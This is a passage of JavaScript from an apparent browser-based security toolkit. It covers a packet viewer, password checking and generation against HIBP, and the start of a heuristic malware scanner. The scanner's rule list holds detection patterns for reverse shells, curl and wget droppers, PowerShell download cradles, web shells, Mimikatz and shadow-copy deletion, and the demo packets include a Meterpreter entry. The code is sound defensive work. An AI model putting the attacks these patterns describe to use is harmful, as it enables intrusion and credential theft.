$on('packetAnalyzeBtn', 'click',()=>{if(!packetFileBuffer)return;try{packetData=parsePacketsPCAP(packetFileBuffer);document.getElementById('packetExportBtn').disabled=false;filterPacketTable();if(document.getElementById('packetStatsToggle').classList.contains('active')){document.getElementById('packetStatsPanel').style.display='block';renderPacketStats();}logActivity('Packet: Parsed '+packetData.length+' packets');toast('Parsed '+packetData.length+' packets!','success');}catch(e){toast(e.message,'error');}});
$on('packetExportBtn', 'click',()=>{if(!packetData.length)return;const hdr='ID,Time,Src IP,Src Port,Dst IP,Dst Port,Protocol,Flags,Length,Service\n';const rows=packetData.map(p=>[p.id,p.time,p.srcIP,p.srcPort||'',p.dstIP,p.dstPort||'',p.proto,p.flags.join('|'),p.length,p.service||''].join(',')).join('\n');downloadText('packets_export.csv',hdr+rows);toast('CSV exported!','success');});
$on('packetDemoBtn', 'click',()=>{
  packetData=[{id:1,time:'1234567890.123456',srcIP:'192.168.1.105',dstIP:'8.8.8.8',proto:'DNS',srcPort:54321,dstPort:53,payload:'query: google.com A',flags:[],ttl:64,length:74,service:'DNS'},{id:2,time:'1234567890.124100',srcIP:'192.168.1.105',dstIP:'104.16.132.229',proto:'TLS/HTTPS',srcPort:51200,dstPort:443,payload:'TLS ClientHello',flags:['SYN'],ttl:64,length:1514,service:'HTTPS'},{id:3,time:'1234567890.125000',srcIP:'192.168.1.1',dstIP:'192.168.1.255',proto:'UDP',srcPort:137,dstPort:137,payload:'NBNS broadcast',flags:[],ttl:64,length:110,service:null},{id:4,time:'1234567890.126500',srcIP:'10.0.0.2',dstIP:'192.168.1.105',proto:'HTTP',srcPort:80,dstPort:49200,payload:'HTTP/1.1 200 OK',flags:['PSH','ACK'],ttl:48,length:512,service:'HTTP'},{id:5,time:'1234567890.127800',srcIP:'192.168.1.105',dstIP:'8.8.8.8',proto:'ICMP',srcPort:null,dstPort:null,payload:'Echo Request',flags:[],ttl:64,length:98,service:null},{id:6,time:'1234567890.130000',srcIP:'172.16.0.1',dstIP:'192.168.1.1',proto:'SSH',srcPort:22,dstPort:55100,payload:'SSH-2.0-OpenSSH_8.9',flags:['PSH','ACK'],ttl:64,length:256,service:'SSH'},{id:7,time:'1234567890.132000',srcIP:'45.33.32.156',dstIP:'192.168.1.105',proto:'TCP',srcPort:4444,dstPort:49300,payload:'Meterpreter stage',flags:['PSH','ACK'],ttl:48,length:1024,service:'Metasploit'},{id:8,time:'1234567890.133000',srcIP:'192.168.1.105',dstIP:'mailserver.com',proto:'SMTP',srcPort:55200,dstPort:25,payload:'EHLO localhost',flags:['PSH'],ttl:64,length:180,service:'SMTP'}];
  document.getElementById('packetExportBtn').disabled=false;filterPacketTable();logActivity('Packet: Demo loaded');toast('Demo loaded!','info');
});

// =============================================
// PASSWORD CHECKER
// =============================================
$on('pwVisToggle', 'click',()=>{const inp=document.getElementById('pwInput');const ic=document.getElementById('pwVisIcon');if(inp.type==='password'){inp.type='text';ic.className='fas fa-eye-slash';}else{inp.type='password';ic.className='fas fa-eye';}});
$on('pwInput', 'input',debounce(function(){
  const pw=this.value;const bar=document.getElementById('pwStrengthBar');const txt=document.getElementById('pwStrengthText');const list=document.getElementById('pwChecklist');
  if(!pw){bar.style.width='0%';txt.textContent='';list.innerHTML='';return;}
  let score=0;
  const checks=[{label:'At least 8 characters',pass:pw.length>=8},{label:'At least 12 characters',pass:pw.length>=12},{label:'At least 16 characters',pass:pw.length>=16},{label:'Uppercase & lowercase',pass:/[a-z]/.test(pw)&&/[A-Z]/.test(pw)},{label:'Contains a number',pass:/\d/.test(pw)},{label:'Special character',pass:/[^a-zA-Z0-9]/.test(pw)}];
  checks.forEach(c=>{if(c.pass)score++;});
  list.innerHTML=checks.map(c=>'<div style="display:flex;align-items:center;gap:6px;font-size:11px"><i class="fas '+(c.pass?'fa-circle-check':'fa-circle-xmark')+'" style="color:'+(c.pass?'var(--accent)':'var(--muted)')+';width:12px"></i><span style="color:'+(c.pass?'var(--text)':'var(--muted)')+'">'+c.label+'</span></div>').join('');
  const lvls=[{w:'15%',c:'var(--danger)',t:'Very Weak'},{w:'30%',c:'var(--danger)',t:'Weak'},{w:'50%',c:'var(--warn)',t:'Fair'},{w:'70%',c:'var(--warn)',t:'Good'},{w:'85%',c:'var(--accent)',t:'Strong'},{w:'100%',c:'var(--accent)',t:'Very Strong'}];
  const l=lvls[Math.min(score,lvls.length-1)];
  bar.style.width=l.w;bar.style.background=l.c;txt.textContent='Strength: '+l.t;txt.style.color=l.c;
},150));
$on('clearPasswordBtn', 'click',()=>{document.getElementById('pwInput').value='';document.getElementById('pwChecklist').innerHTML='';document.getElementById('pwStrengthBar').style.width='0%';document.getElementById('pwStrengthText').textContent='';document.getElementById('pwResult').innerHTML='<div style="text-align:center;color:var(--muted)"><i class="fas fa-shield-halved" style="font-size:40px;opacity:.15;margin-bottom:10px;display:block"></i></div>';toast('Cleared','info');});
$on('pwCheckBtn', 'click',async()=>{
  const pw=document.getElementById('pwInput').value;if(!pw)return toast('Enter a password','warn');
  const btn=document.getElementById('pwCheckBtn');const orig=btn.innerHTML;btn.disabled=true;btn.innerHTML='<span class="spinner"></span> Checking...';
  try{
    const sha1=CryptoJS.SHA1(pw).toString().toUpperCase();
    const prefix=sha1.substring(0,5),suffix=sha1.substring(5);
    const resp=await fetch('https://api.pwnedpasswords.com/range/'+prefix,{headers:{'Add-Padding':'true'}});
    if(!resp.ok)throw new Error('HIBP API error '+resp.status);
    const text=await resp.text();
    let count=0;for(const line of text.split('\n')){const[hs,cnt]=line.split(':');if(hs===suffix){count=parseInt(cnt);break;}}
    let rc,ri;if(count===0){rc='var(--accent)';ri='fa-shield-halved';}else if(count<1000){rc='var(--warn)';ri='fa-triangle-exclamation';}else{rc='var(--danger)';ri='fa-skull-crossbones';}
    const rd=document.getElementById('pwResult');rd.style.display='flex';rd.style.alignItems='flex-start';
    rd.innerHTML='<div style="width:100%;padding:4px"><div class="glass-sm mb-3" style="border-color:'+rc+'30"><div style="display:flex;align-items:center;gap:10px;margin-bottom:8px"><i class="fas '+ri+'" style="color:'+rc+';font-size:24px"></i><div><div style="font-weight:800;font-size:15px;color:'+rc+'">'+(count===0?'Not Found in Breaches':'Found in '+count.toLocaleString()+' Breaches')+'</div></div></div>'+(count>0?'<p style="color:var(--muted);font-size:11px">Change this password immediately.</p>':'<p style="color:var(--muted);font-size:11px">Not found in HIBP database.</p>')+'</div><div class="glass-sm"><p style="font-size:10px;font-weight:700;color:var(--muted);margin-bottom:4px">k-ANONYMITY PROOF</p><p style="font-size:10px;font-family:\'JetBrains Mono\',monospace;color:var(--muted)">Sent: <span style="color:var(--cyan)">'+sha1.substring(0,5)+'</span>'+'*'.repeat(35)+'</p></div></div>';
    addStats(1);logActivity('Password: '+(count===0?'Safe':count.toLocaleString()+' breaches'));toast(count===0?'Password safe!':'Breached!',count===0?'success':'warn');
  }catch(e){toast(e.message.includes('fetch')?'Cannot reach HIBP API':e.message,'error');}
  finally{btn.disabled=false;btn.innerHTML=orig;}
});

// =============================================
// PASSWORD GENERATOR
// =============================================
$on('pwgenLength', 'input',function(){document.getElementById('pwgenLenLabel').textContent=this.value;});
['pwgenUpperToggle','pwgenNumToggle','pwgenSymToggle','pwgenLeetToggle'].forEach(id=>{$on(id,'click',function(){this.classList.toggle('active');});});
$on('clearPwGenBtn', 'click',()=>{document.getElementById('pwgenResult').innerHTML='<div style="text-align:center;color:var(--muted)"><i class="fas fa-wand-magic-sparkles" style="font-size:42px;opacity:.15;margin-bottom:12px;display:block"></i></div>';document.getElementById('pwgenCopyAllBtn').disabled=true;document.getElementById('pwgenKeywords').value='';toast('Cleared','info');});
const LEET_MAP={a:'4',e:'3',i:'1',o:'0',s:'$',t:'+',l:'|',g:'9',z:'2'};
const WORDLIST_NOUNS=['dragon','mountain','coffee','storm','tiger','shadow','crystal','phantom','voltage','cipher','matrix','falcon','thunder','eclipse','nexus','cobalt'];
const WORDLIST_ADJ=['dark','swift','silent','golden','silver','frozen','electric','neon','iron','steel','blazing','cosmic','hidden','fierce','wild'];
function applyLeet(word){return word.split('').map(c=>LEET_MAP[c.toLowerCase()]&&Math.random()<0.5?LEET_MAP[c.toLowerCase()]:c).join('');}
function rndItem(arr){return arr[Math.floor(Math.random()*arr.length)];}
function secureRand(){return window.crypto.getRandomValues(new Uint32Array(1))[0]/0xFFFFFFFF;}
function secureRandInt(max){return Math.floor(secureRand()*max);}

function generatePassword(keywords,opts){
  const{length,useUpper,useNums,useSyms,useLeet,format}=opts;
  const syms='!@#$%^&*()-_=+[]{}|;:,.<>?',nums='0123456789',lower='abcdefghijklmnopqrstuvwxyz',upper='ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  if(format==='pin')return Array.from(window.crypto.getRandomValues(new Uint8Array(Math.max(4,length)))).map(b=>b%10).join('').slice(0,length);
  if(format==='passphrase'){const allW=[...WORDLIST_NOUNS,...WORDLIST_ADJ];const words=[];if(keywords.length)keywords.forEach(k=>{if(k.length>=3)words.push(useLeet?applyLeet(k):k);});while(words.length<4)words.push(rndItem(allW));const sep=useSyms?rndItem(['.','-','_','!','#','@']):'_';let pw=words.slice(0,4).map(w=>useUpper?w[0].toUpperCase()+w.slice(1):w).join(sep);if(useNums)pw+=secureRandInt(9999).toString().padStart(4,'0');return pw;}
  if(format==='keyword'&&keywords.length){let base=rndItem(keywords);if(useLeet)base=applyLeet(base);if(useUpper)base=base[0].toUpperCase()+base.slice(1);const extra=keywords.length>1?rndItem(keywords.filter(k=>k!==base)):rndItem(WORDLIST_NOUNS);let extra2=useLeet?applyLeet(extra):extra;if(useUpper)extra2=extra2[0].toUpperCase()+extra2.slice(1);const sep=useSyms?rndItem('!@#$%^&*()-_=+'.split('')):'_';let pw=base+sep+extra2;if(useNums)pw+=secureRandInt(9999).toString().padStart(4,'0');if(useSyms)pw+=rndItem(syms.split(''));while(pw.length<length)pw+=lower[secureRandInt(lower.length)];return pw.slice(0,length);}
  let pool=lower;if(useUpper)pool+=upper;if(useNums)pool+=nums;if(useSyms)pool+=syms;
  const required=[lower[secureRandInt(lower.length)]];
  if(useUpper)required.push(upper[secureRandInt(upper.length)]);if(useNums)required.push(nums[secureRandInt(nums.length)]);if(useSyms)required.push(syms[secureRandInt(syms.length)]);
  while(required.length<length)required.push(pool[secureRandInt(pool.length)]);
  for(let i=required.length-1;i>0;i--){const j=secureRandInt(i+1);[required[i],required[j]]=[required[j],required[i]];}
  return required.slice(0,length).join('');
}

async function checkPasswordHIBP(pw){
  try{const rl=RateLimit.check('hibp',1500);if(!rl.allowed)return{checked:false,count:0,safe:true,rateLimited:true};const sha1=CryptoJS.SHA1(pw).toString().toUpperCase();const prefix=sha1.substring(0,5),suffix=sha1.substring(5);const resp=await fetch('https://api.pwnedpasswords.com/range/'+prefix,{headers:{'Add-Padding':'true'}});if(!resp.ok)return{checked:false,count:0,safe:true};const text=await resp.text();for(const line of text.split('\n')){const[hs,cnt]=line.split(':');if(hs===suffix)return{checked:true,count:parseInt(cnt),safe:false};}return{checked:true,count:0,safe:true};}catch{return{checked:false,count:0,safe:true};}
}

function getPasswordScore(pw){let s=0;if(pw.length>=12)s++;if(pw.length>=16)s++;if(pw.length>=20)s++;if(/[a-z]/.test(pw))s++;if(/[A-Z]/.test(pw))s++;if(/\d/.test(pw))s++;if(/[^a-zA-Z0-9]/.test(pw))s++;return Math.min(s,6);}

$on('pwgenBtn', 'click',async()=>{
  const rawKw=document.getElementById('pwgenKeywords').value.trim();const keywords=rawKw?rawKw.split(/[\s,]+/).filter(Boolean):[];
  const length=parseInt(document.getElementById('pwgenLength').value);
  const useUpper=document.getElementById('pwgenUpperToggle').classList.contains('active');const useNums=document.getElementById('pwgenNumToggle').classList.contains('active');const useSyms=document.getElementById('pwgenSymToggle').classList.contains('active');const useLeet=document.getElementById('pwgenLeetToggle').classList.contains('active');
  const format=document.getElementById('pwgenFormat').value;const batch=parseInt(document.getElementById('pwgenBatch').value);
  const opts={length,useUpper,useNums,useSyms,useLeet,format};
  const btn=document.getElementById('pwgenBtn');const orig=btn.innerHTML;btn.disabled=true;btn.innerHTML='<span class="spinner"></span> Generating...';
  const rd=document.getElementById('pwgenResult');rd.style.display='block';rd.style.alignItems='flex-start';
  rd.innerHTML='<div style="text-align:center;padding:40px"><span class="spinner"></span><p style="color:var(--muted);font-size:12px;margin-top:12px">Checking HIBP...</p></div>';
  const results=[];
  for(let i=0;i<batch;i++){let pw=generatePassword(keywords,opts),attempts=0,hibp={checked:false,count:0,safe:true};while(attempts<5){hibp=await checkPasswordHIBP(pw);if(hibp.safe)break;pw=generatePassword(keywords,opts);attempts++;}results.push({pw,hibp,score:getPasswordScore(pw),attempts});}
  const allPws=results.map(r=>r.pw).join('\n');
  document.getElementById('pwgenCopyAllBtn').disabled=false;document.getElementById('pwgenCopyAllBtn').onclick=()=>copyText(allPws);
  const sLabels=['Very Weak','Weak','Fair','Good','Strong','Very Strong'];const sColors=['var(--danger)','var(--danger)','var(--warn)','var(--warn)','var(--accent)','var(--accent)'];
  const pwKeys=results.map(r=>storeResult(r.pw));
  rd.innerHTML='<div style="width:100%">'+results.map((r,idx)=>'<div class="glass-sm mb-2"><div class="flex items-center justify-between mb-2"><div style="display:flex;gap:6px;align-items:center;margin-left:auto"><span style="font-size:10px;padding:2px 7px;border-radius:4px;background:'+(r.hibp.safe?'rgba(0,255,136,0.08)':'rgba(255,51,102,0.08)')+';color:'+(r.hibp.safe?'var(--accent)':'var(--danger)')+';border:1px solid '+(r.hibp.safe?'rgba(0,255,136,0.2)':'rgba(255,51,102,0.2)')+'"><i class="fas '+(r.hibp.safe?'fa-shield-halved':'fa-skull-crossbones')+'"></i> '+(r.hibp.safe?'Safe':'Breached')+'</span><span style="font-size:10px;color:'+sColors[Math.min(r.score,5)]+'">'+sLabels[Math.min(r.score,5)]+'</span><button class="btn btn-secondary btn-sm pwgen-copy-btn" data-pki="'+pwKeys[idx]+'"><i class="fas fa-copy"></i></button></div></div><div class="pw-gen-result" style="font-size:'+(r.pw.length>30?'11px':'14px')+'">'+r.pw.replace(/</g,'&lt;')+'</div><div class="strength-bar mt-1"><div class="strength-fill" style="width:'+(r.score/6*100).toFixed(0)+'%;background:'+sColors[Math.min(r.score,5)]+'"></div></div></div>').join('')+'</div>';
  rd.querySelectorAll('.pwgen-copy-btn').forEach(btn2=>btn2.addEventListener('click',()=>copyText(getResult(parseInt(btn2.dataset.pki)))));
  addStats(batch);logActivity('PwGen: '+batch+' passwords');toast('Generated '+batch+'!','success');btn.disabled=false;btn.innerHTML=orig;
});

// =============================================
// MALWARE SCANNER — FULLY FIXED
// =============================================
let malwareFileRef=null;

function shannonEntropy(bytes){
  const freq=new Array(256).fill(0);
  for(const b of bytes)freq[b]++;
  const len=bytes.length;
  return-freq.reduce((sum,f)=>{if(!f)return sum;const p=f/len;return sum+p*Math.log2(p);},0);
}


// Compute SHA-256 of a Uint8Array — used for VirusTotal file hash lookup
async function sha256Hex(bytes){
  const hashBuf=await crypto.subtle.digest('SHA-256',bytes.buffer);
  return Array.from(new Uint8Array(hashBuf)).map(b=>b.toString(16).padStart(2,'0')).join('');
}

// VirusTotal file hash lookup (does NOT upload the file — only sends the hash)
async function vtFileLookup(sha256){
  const key=getVtApiKey();
  if(!key)return null;
  const rl=RateLimit.check('vt-file',15000); // 4 req/min free tier
  if(!rl.allowed){toast('VirusTotal: rate limit — wait '+rl.wait+'s','warn');return{error:'Rate limited — wait '+rl.wait+'s'};}
  try{
    const resp=await fetch('https://www.virustotal.com/api/v3/files/'+sha256,{
      headers:{'x-apikey':key,'Accept':'application/json'}
    });
    if(resp.status===404)return{found:false,sha256};
    if(!resp.ok)return{error:'VT API error: '+resp.status,sha256};
    const data=await resp.json();
    const attrs=data.data?.attributes||{};
    const stats=attrs.last_analysis_stats||{};
    const results=attrs.last_analysis_results||{};
    const detected=Object.entries(results).filter(([,v])=>v.category==='malicious');
    const suspicious=Object.entries(results).filter(([,v])=>v.category==='suspicious');
    const total=Object.values(stats).reduce((s,v)=>s+v,0);
    return{
      found:true,sha256,
      malicious:stats.malicious||0,
      suspicious_count:stats.suspicious||0,
      harmless:stats.harmless||0,
      undetected:stats.undetected||0,
      total,
      detectedEngines:detected.slice(0,8).map(([eng,v])=>({engine:eng,result:v.result})),
      suspiciousEngines:suspicious.slice(0,4).map(([eng,v])=>({engine:eng,result:v.result})),
      name:attrs.meaningful_name||attrs.name||'',
      type:attrs.type_description||'',
      reputation:attrs.reputation||0,
      tags:attrs.tags||[],
      firstSeen:attrs.first_submission_date?new Date(attrs.first_submission_date*1000).toLocaleDateString():'Unknown',
      lastSeen:attrs.last_analysis_date?new Date(attrs.last_analysis_date*1000).toLocaleDateString():'Unknown',
    };
  }catch(e){return{error:'VT lookup failed: '+e.message,sha256};}
}

// Render VirusTotal result block
function renderVtBlock(vt){
  if(!vt)return'';
  if(vt.error)return`<div class="glass-sm mb-3" style="border-color:rgba(255,170,0,0.3)"><p style="font-size:11px;color:var(--warn)"><i class="fas fa-triangle-exclamation"></i> VirusTotal: ${vt.error}</p></div>`;
  if(!vt.found)return`<div class="glass-sm mb-3" style="border-color:rgba(0,212,255,0.2)"><div style="display:flex;align-items:center;gap:10px"><i class="fas fa-database" style="color:var(--cyan);font-size:18px"></i><div><p style="font-weight:700;font-size:12px;color:var(--cyan)">Not in VirusTotal Database</p><p style="font-size:10px;color:var(--muted)">File hash not seen before — new or private file. Heuristic scan only.</p><p style="font-size:10px;color:var(--muted);font-family:'JetBrains Mono'">${vt.sha256}</p></div></div></div>`;
  const pct=vt.total>0?Math.round(vt.malicious/vt.total*100):0;
  const vtRisk=vt.malicious>=5?'var(--danger)':vt.malicious>=1?'var(--warn)':'var(--accent)';
  const vtLabel=vt.malicious>=5?'MALICIOUS':vt.malicious>=1?'SUSPICIOUS':'CLEAN';
  let html=`<div class="glass-sm mb-3" style="border-color:${vtRisk}30">
    <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px">
      <i class="fas fa-shield-virus" style="color:${vtRisk};font-size:22px"></i>
      <div style="flex:1">
        <p style="font-weight:800;font-size:13px;color:${vtRisk}"><i class="fas fa-circle" style="font-size:8px;margin-right:4px"></i>VirusTotal: ${vtLabel} &nbsp;·&nbsp; <span style="font-family:'JetBrains Mono'">${vt.malicious}/${vt.total}</span> engines</p>
        <p style="font-size:10px;color:var(--muted)">First seen: ${vt.firstSeen} &nbsp;·&nbsp; Last scanned: ${vt.lastSeen}${vt.name?' &nbsp;·&nbsp; '+esc(vt.name):''}</p>
      </div>
    </div>
    <div class="progress-bar" style="margin-bottom:8px"><div class="progress-fill" style="width:${pct}%;background:${vtRisk}"></div></div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:6px">
      ${[['Malicious',vt.malicious,'var(--danger)'],['Suspicious',vt.suspicious_count,'var(--warn)'],['Harmless',vt.harmless,'var(--accent)'],['Undetected',vt.undetected,'var(--muted)']].map(([l,v,c])=>`<div style="text-align:center;padding:6px 10px;background:var(--input-bg);border-radius:6px;flex:1"><div style="font-size:14px;font-weight:800;color:${c};font-family:'JetBrains Mono'">${v}</div><div style="font-size:9px;color:var(--muted)">${l}</div></div>`).join('')}
    </div>
    <p style="font-size:9px;font-family:'JetBrains Mono';color:var(--muted);word-break:break-all">SHA-256: ${vt.sha256}</p>`;
  if(vt.tags.length)html+=`<div style="display:flex;flex-wrap:wrap;gap:4px;margin-top:6px">${vt.tags.slice(0,8).map(t=>`<span style="font-size:9px;padding:1px 7px;border-radius:4px;background:rgba(0,212,255,0.08);color:var(--cyan);border:1px solid rgba(0,212,255,0.15)">${esc(t)}</span>`).join('')}</div>`;
  if(vt.detectedEngines.length)html+=`<div style="margin-top:8px"><p style="font-size:10px;font-weight:700;color:var(--danger);margin-bottom:4px">Flagging Engines:</p>`+vt.detectedEngines.map(e=>`<div style="display:flex;gap:6px;padding:3px 0;border-bottom:1px solid var(--border);font-size:10px"><span style="color:var(--muted);min-width:120px;flex-shrink:0">${esc(e.engine)}</span><span style="color:var(--danger)">${esc(e.result||'malicious')}</span></div>`).join('')+'</div>';
  html+='</div>';
  return html;
}

function parsePEHeader(bytes){
  if(bytes.length<64)return null;
  try{
    const view=new DataView(bytes.buffer,bytes.byteOffset,bytes.byteLength);
    if(view.getUint16(0,true)!==0x5A4D)return null;
    const peOffset=view.getUint32(0x3C,true);
    if(peOffset+24>bytes.length)return null;
    if(view.getUint32(peOffset,true)!==0x00004550)return null;
    const machine=view.getUint16(peOffset+4,true);
    const numSections=view.getUint16(peOffset+6,true);
    const timestamp=view.getUint32(peOffset+8,true);
    const characteristics=view.getUint16(peOffset+22,true);
    const optMagic=peOffset+24<bytes.length?view.getUint16(peOffset+24,true):0;
    const machines={0x14C:'x86 (i386)',0x8664:'x64 (AMD64)',0xAA64:'ARM64',0x1C0:'ARM'};
    return{valid:true,arch:machines[machine]||'Unknown (0x'+machine.toString(16)+')',numSections,timestamp:new Date(timestamp*1000).toUTCString(),isDLL:!!(characteristics&0x2000),isExe:!!(characteristics&0x0002),is64:optMagic===0x20B};
  }catch{return null;}
}

function parseELFHeader(bytes){
  if(bytes.length<16)return null;
  if(bytes[0]!==0x7F||bytes[1]!==0x45||bytes[2]!==0x4C||bytes[3]!==0x46)return null;
  const cls=bytes[4]===1?'32-bit':bytes[4]===2?'64-bit':'Unknown';
  const le=bytes[5]===1;
  try{
    const view=new DataView(bytes.buffer,bytes.byteOffset);
    const type=view.getUint16(16,le);
    const machine=view.getUint16(18,le);
    const types={1:'Relocatable',2:'Executable',3:'Shared object (.so)',4:'Core dump'};
    const machines={3:'x86',62:'x86-64',40:'ARM',183:'AArch64',8:'MIPS'};
    return{valid:true,cls,type:types[type]||'Unknown',machine:machines[machine]||'0x'+machine.toString(16)};
  }catch{return null;}
}

function detectFileType(bytes){
  const h=(o,l)=>Array.from(bytes.slice(o,o+l)).map(b=>b.toString(16).padStart(2,'0')).join('');
  const sigs=[
    {magic:'4d5a',offset:0,type:'PE/Windows Executable (MZ)',risk:'medium'},
    {magic:'7f454c46',offset:0,type:'ELF/Linux Executable',risk:'medium'},
    {magic:'cafebabe',offset:0,type:'Java Class File',risk:'low'},
    {magic:'504b0304',offset:0,type:'ZIP/JAR/DOCX Archive',risk:'low'},
    {magic:'25504446',offset:0,type:'PDF Document',risk:'low'},
    {magic:'d0cf11e0',offset:0,type:'MS Office OLE2',risk:'medium'},
    {magic:'526172211a07',offset:0,type:'RAR Archive',risk:'low'},
    {magic:'1f8b08',offset:0,type:'GZIP Archive',risk:'low'},
    {magic:'ffd8ff',offset:0,type:'JPEG Image',risk:'safe'},
    {magic:'89504e47',offset:0,type:'PNG Image',risk:'safe'},
    {magic:'4c000000',offset:0,type:'Windows Shortcut (.lnk)',risk:'high'},
    {magic:'52656741',offset:0,type:'Windows Registry File',risk:'medium'},
  ];
  for(const sig of sigs){if(h(sig.offset,sig.magic.length/2).startsWith(sig.magic))return sig;}
  // Check for scripts by reading text
  return{type:'Unknown / Text / Data',risk:'low'};
}

function analyzePESections(bytes,peInfo){
  if(!peInfo||!peInfo.valid)return[];
  try{
    const view=new DataView(bytes.buffer,bytes.byteOffset,bytes.byteLength);
    const peOffset=view.getUint32(0x3C,true);
    const optHeaderSize=view.getUint16(peOffset+20,true);
    const sectionStart=peOffset+24+optHeaderSize;
    const sections=[];
    for(let i=0;i<Math.min(peInfo.numSections,16);i++){
      const off=sectionStart+i*40;if(off+40>bytes.length)break;
      const nameBytes=bytes.slice(off,off+8);
      const name=new TextDecoder().decode(nameBytes).replace(/\0/g,'').trim();
      const rawSize=view.getUint32(off+16,true);
      const rawOff=view.getUint32(off+20,true);
      const chars=view.getUint32(off+36,true);
      const isExec=!!(chars&0x20000000);const isWrite=!!(chars&0x80000000);
      let entropy=0;
      if(rawOff>0&&rawOff+rawSize<=bytes.length&&rawSize>0){
        entropy=shannonEntropy(bytes.slice(rawOff,rawOff+Math.min(rawSize,4096)));
      }
      sections.push({name:name||('sec_'+i),rawSize,entropy,isExec,isWrite});
    }
    return sections;
  }catch{return[];}
}

// 36 YARA-like rules
const YARA_RULES=[
  {name:'Reverse Shell (bash)',pattern:/\/bin\/bash\s+-i\s*>&\s*\/dev\/tcp/i,severity:'critical',cat:'Backdoor'},
  {name:'Reverse Shell (sh)',pattern:/sh\s+-i\s*>&\s*\/dev\/tcp/i,severity:'critical',cat:'Backdoor'},
  {name:'Netcat Backdoor (-e)',pattern:/nc\s+(-e|-c)\s+\/(bin|usr)\/(sh|bash)/i,severity:'critical',cat:'Backdoor'},
  {name:'Netcat Listener',pattern:/nc\s+-l\s*-?p\s*\d+/i,severity:'high',cat:'Backdoor'},
  {name:'Python Reverse Shell',pattern:/import\s+socket[\s\S]{0,200}subprocess|socket\.connect[\s\S]{0,100}\/bin\/(bash|sh)/is,severity:'critical',cat:'Backdoor'},
  {name:'Perl Reverse Shell',pattern:/perl\s+-e[\s\S]{0,100}socket[\s\S]{0,100}connect/i,severity:'critical',cat:'Backdoor'},
  {name:'Wget Dropper',pattern:/wget\s+https?:\/\/\S+\s+-[Oq]\s*\/?(tmp|dev|var)/i,severity:'critical',cat:'Dropper'},
  {name:'Curl Pipe Dropper',pattern:/curl\s+-[sLo]+\s+https?:\/\/\S+\s*[|>]/i,severity:'critical',cat:'Dropper'},
  {name:'PowerShell Download',pattern:/\(new-object\s+net\.webclient\)\.downloadstring|Invoke-WebRequest|IEX\s*\(/i,severity:'critical',cat:'Dropper'},
  {name:'PowerShell Encoded',pattern:/powershell[^;\n]{0,80}-enc\s+[A-Za-z0-9+/]{20,}/i,severity:'critical',cat:'Obfuscation'},
  {name:'PowerShell Bypass',pattern:/powershell[^;\n]{0,80}-exec(ution)?\s*(bypass|unrestricted)/i,severity:'high',cat:'Policy Bypass'},
  {name:'PHP Eval+Decode',pattern:/<\?php[\s\S]{0,200}eval\s*\(\s*base64_decode/is,severity:'critical',cat:'Web Shell'},
  {name:'PHP System/Exec',pattern:/<\?php[\s\S]{0,300}(system|passthru|shell_exec|exec)\s*\(\s*\$_(GET|POST|REQUEST)/is,severity:'critical',cat:'Web Shell'},
  {name:'JSP Runtime Exec',pattern:/Runtime\.getRuntime\(\)\.exec\(/i,severity:'critical',cat:'Web Shell'},
  {name:'JS Eval+Decode',pattern:/eval\s*\(\s*(unescape|atob|String\.fromCharCode)/i,severity:'high',cat:'Obfuscation'},
  {name:'Char Code Shellcode',pattern:/String\.fromCharCode\s*\(\s*(\d+\s*,\s*){10,}/i,severity:'high',cat:'Shellcode'},
  {name:'Mimikatz',pattern:/sekurlsa::|lsadump::|kerberos::|privilege::debug/i,severity:'critical',cat:'Credential Theft'},
  {name:'SAM Database Dump',pattern:/reg\s+save\s+hklm\\sam|reg\s+save\s+hklm\\system/i,severity:'critical',cat:'Credential Theft'},
  {name:'/etc/shadow Access',pattern:/\/etc\/(passwd|shadow|sudoers)/i,severity:'high',cat:'Credential Theft'},
  {name:'Cron Persistence',pattern:/crontab\s+-[el]|\/etc\/cron\./i,severity:'high',cat:'Persistence'},
  {name:'Registry Run Key',pattern:/HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run/i,severity:'high',cat:'Persistence'},
  {name:'Startup Folder',pattern:/AppData\\Roaming\\Microsoft\\Windows\\Start\s*Menu\\Programs\\Startup/i,severity:'high',cat:'Persistence'},
  {name:'SUID Chmod',pattern:/chmod\s+[+]?s\s+\/\w+|chmod\s+4[0-9]{3}\s+\/\w+/i,severity:'critical',cat:'Privilege Escalation'},
  {name:'Sudo Shell Spawn',pattern:/sudo\s+-l\s*;\s*(bash|sh|python|perl)|sudo\s+(bash|sh)\s+-[ip]/i,severity:'high',cat:'Privilege Escalation'},
  {name:'Metasploit Pattern',pattern:/meterpreter|metasploit|msf_payload|payload\.rb/i,severity:'critical',cat:'C2 Framework'},
  {name:'Cobalt Strike',pattern:/beacon\.(dll|exe)|cobaltstrike|cs\.exe/i,severity:'critical',cat:'C2 Framework'},
  {name:'Empire Framework',pattern:/powershell\s+empire|EmPyre/i,severity:'critical',cat:'C2 Framework'},
  {name:'Shadow Copy Delete',pattern:/vssadmin\s+delete\s+shadows|wmic\s+shadowcopy\s+delete/i,severity:'critical',cat:'Ransomware'},
  {name:'Bcdedit Recovery Off',pattern:/bcdedit\s+\/set\s+\{default\}\s+recoveryenabled\s+no/i,severity:'critical',cat:'Ransomware'},
  {name:'AWS Access Key',pattern:/AKIA[0-9A-Z]{16}/,severity:'high',cat:'Secret Exposure'},
  {name:'Private Key Embedded',pattern:/-----BEGIN\s+(RSA|EC|DSA|OPENSSH)\s+PRIVATE KEY-----/,severity:'high',cat:'Secret Exposure'},
  {name:'Hardcoded Password',pattern:/password\s*=\s*["'][^"']{6,}["']/i,severity:'medium',cat:'Secret Exposure'},
  {name:'EICAR Test Signature',pattern:/X5O!P%@AP\[4\\PZX54\(P\^/,severity:'medium',cat:'Test Signature'},
  {name:'SQL Injection Pattern',pattern:/'\s*OR\s*'1'\s*=\s*'1|UNION\s+SELECT\s+NULL/i,severity:'medium',cat:'Injection Pattern'},
  {name:'Docker Escape Attempt',pattern:/docker\.sock|\/var\/run\/docker\.sock/i,severity:'high',cat:'Container Escape'},
  {name:'Kernel Exploit Indicator',pattern:/\/proc\/self\/mem|ptrace\s*\(|mmap\s*\([^)]*PROT_EXEC/i,severity:'high',cat:'Exploit'}
];

$on('clearMalwareBtn', 'click',()=>{
  malwareFileRef=null;document.getElementById('malwareFile').value='';
  document.getElementById('malwareFileInfo').style.display='none';
  document.getElementById('malwareScanBtn').disabled=true;
